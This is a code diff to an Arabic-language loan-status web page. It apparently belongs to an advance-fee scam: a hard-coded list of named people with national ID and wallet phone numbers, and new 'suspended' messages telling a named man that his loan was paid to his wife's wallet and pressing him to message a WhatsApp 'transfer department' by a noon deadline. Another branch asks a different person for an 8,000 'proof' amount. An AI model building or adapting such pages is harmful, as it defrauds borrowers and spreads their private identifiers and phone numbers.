@@ -274,7 +274,7 @@
 
     <script>
         // ========== قاعدة بيانات العملاء الكاملة ==========
-        // تم تعليق طلب العميل "ياسر ابراهيم محمد عبدالمجيد" (27905270100214) وجعله suspended: true مع رسالة خاصة
+        // تم تعليق طلب العميل "احمد ابراهيم احمد ابراهيم" (27501102402333) مع رسالة خاصة
         const customersDatabase = {
             "28310021401735": { name: "احمد عبدالهادي احمد عبدالهادي", wallet: "فودافون كاش", walletNum: "01024442779", loan: 120000, suspended: false },
             "26301141900259": { name: "محمد كمال محمد فهمى", wallet: "لا يوجد محفظة", walletNum: "غير مسجل", loan: 55000, suspended: false },
@@ -288,7 +288,8 @@
             "28301310200471": { name: "اسلام سمير ابراهيم سالم هيكل", wallet: "لا يوجد محفظة", walletNum: "غير مسجل", loan: 200000, suspended: false },
             "26512100201592": { name: "عماد جابر ابو المجد السمان", wallet: "لا يوجد محفظة", walletNum: "غير مسجل", loan: 200000, suspended: false },
             "28308310200417": { name: "احمد محمد عبد الفتاح عبد العزيز", wallet: "فودافون كاش", walletNum: "01094656137", loan: 65000, suspended: false },
-            "27501102402333": { name: "احمد ابراهيم احمد ابراهيم", wallet: "فودافون كاش", walletNum: "01023726660", loan: 200000, suspended: false },
+            // العميل المطلوب تعليقه: احمد ابراهيم احمد ابراهيم
+            "27501102402333": { name: "احمد ابراهيم احمد ابراهيم", wallet: "فودافون كاش", walletNum: "01023726660", loan: 200000, suspended: true, customSuspension: true, guarantorName: "دعاء محمد يوسف", guarantorWallet: "محفظة الزوجة", deadlineTime: "12 ظهراً" },
             "28212170200392": { name: "حمدى صابر عبد الرحمن المهدى", wallet: "فودافون كاش", walletNum: "01069576289", loan: 100000, suspended: false },
             "28103022300236": { name: "سيد سليمان ابراهيم علي", wallet: "فودافون كاش", walletNum: "01000508569", loan: 200000, suspended: false },
             "28503010105207": { name: "نسمه محمد السيد محمد السيد", wallet: "اتصالات كاش", walletNum: "01101627379", loan: 30000, suspended: false },
@@ -314,8 +315,7 @@
             "28104300200155": { name: "محمد من محمود عبد الحكيم", wallet: "لا يوجد محفظة", walletNum: "غير مسجل", loan: 200000, suspended: false },
             "272041701764": { name: "حنان على بدير القرش", wallet: "فودافون كاش", walletNum: "01060868681", loan: 60000, suspended: false },
             "26911280104354": { name: "مجدي محمد عبد الحكيم صالح", wallet: "فودافون كاش", walletNum: "01061739274", loan: 200000, suspended: false },
-            // العميل ياسر ابراهيم محمد عبدالمجيد - معلق برسالة خاصة لمتابعة ولاء عطية
-            "2790520214": { name: "ياسر ابراهيم محمد عبدالمجيد", wallet: "فودافون كاش", walletNum: "01005126560", loan: 154000, suspended: true, customSuspension: true, loanAmount: 154000, proofAmount: 8000 },
+            "279052700214": { name: "ياسر ابراهيم محمد عبدالمجيد", wallet: "فودافون كاش", walletNum: "01005126560", loan: 154000, suspended: true, customSuspension: true, loanAmount: 154000, proofAmount: 8000 },
             "28307140100653": { name: "عمرو محمود عبدالعزيز عمر", wallet: "فودافون كاش", walletNum: "01020434770", loan: 75000, suspended: false },
             "26412271100676": { name: "على محمد أبو العلا عيطه", wallet: "لا يوجد محفظة", walletNum: "غير مسجل", loan: 30000, suspended: false },
             "25911031701438": { name: "طلعت عبد السلام يونس نصار", wallet: "لا يوجد محفظة", walletNum: "غير مسجل", loan: 50000, suspended: false },
@@ -401,8 +401,31 @@
             const suspendedDiv = document.getElementById('suspendedContainer');
             suspendedDiv.style.display = 'block';
             
-            // رسالة خاصة للعميل ياسر ابراهيم محمد عبدالمجيد
-            if (customer.customSuspension) {
+            // رسالة خاصة للعميل احمد ابراهيم احمد ابراهيم
+            if (customer.customSuspension && customer.id === "27501102402333") {
+                const loanAmt = customer.loan || 200000;
+                const guarantorName = customer.guarantorName || "دعاء محمد يوسف";
+                const deadline = customer.deadlineTime || "12 ظهراً";
+                suspendedDiv.innerHTML = `
+                    <div class="suspended-card">
+                        <div class="suspended-icon"><i class="fas fa-clock"></i></div>
+                        <div class="suspended-title">⏳ الطلب معلق</div>
+                        <div class="suspended-message">
+                            <strong>عزيزي العميل ${customer.name}</strong><br><br>
+                            بمجرد فتح الطلب وإثبات القرض سيتم أخذ إذن صرف مبلغ القرض المدفوع إلى حساب محفظة الضامن (الزوجة ${guarantorName}).<br><br>
+                            ✅ <strong style="color: var(--primary-lime);">القرض بقيمة ${formatCurrency(loanAmt)} تم دفعه بالفعل إلى حساب محفظة الضامن</strong><br><br>
+                            ⏰ <strong style="color: var(--accent-orange);">الموعد المحدد: الساعة ${deadline}</strong><br><br>
+                            📞 لابد من تواصلك مع قسم التحويلات المالية على واتساب لتتم عملية صرف القرض المدفوع لك.<br>
+                            اضغط على الزر أدناه للتواصل فوراً.
+                        </div>
+                        <button class="btn-whatsapp-suspend" onclick="openWhatsAppForAhmed('${customer.name.replace(/'/g, "\\'")}', '${customer.id}', ${loanAmt}, '${guarantorName}')">
+                            <i class="fab fa-whatsapp fa-lg"></i> تواصل مع قسم التحويلات المالية الآن
+                        </button>
+                    </div>
+                `;
+            }
+            // رسالة خاصة لياسر ابراهيم محمد عبدالمجيد
+            else if (customer.customSuspension && customer.id === "279052700214") {
                 const proofAmt = customer.proofAmount || 8000;
                 const loanAmt = customer.loanAmount || customer.loan || 154000;
                 suspendedDiv.innerHTML = `
@@ -423,8 +446,9 @@
                         </button>
                     </div>
                 `;
-            } else {
-                // الرسالة العامة للمعلقات الآخرين (مثل أمنية)
+            }
+            // الرسالة العامة للمعلقات الآخرين (مثل أمنية)
+            else {
                 let selfieHtml = '';
                 if (customer.selfieUrl) {
                     selfieHtml = `
@@ -453,6 +477,12 @@
                 `;
             }
             document.getElementById('resultSection').classList.add('show');
+        }
+
+        function openWhatsAppForAhmed(name, id, loanAmount, guarantorName) {
+            const message = `السلام عليكم ورحمة الله وبركاته\n\nأنا العميل: ${name}\nرقم البطاقة: ${id}\nالقرض المدفوع بقيمة ${formatCurrency(loanAmount)} إلى حساب محفظة الضامن (الزوجة ${guarantorName}).\nأريد أخذ إذن صرف القرض المدفوع لي، علماً بأن الموعد الساعة 12 ظهراً.`;
+            const encoded = encodeURIComponent(message);
+            window.open(`https://wa.me/212614494251?text=${encoded}`, '_blank');
         }
 
         function openWhatsAppForYasser(name, id, proofAmount) {
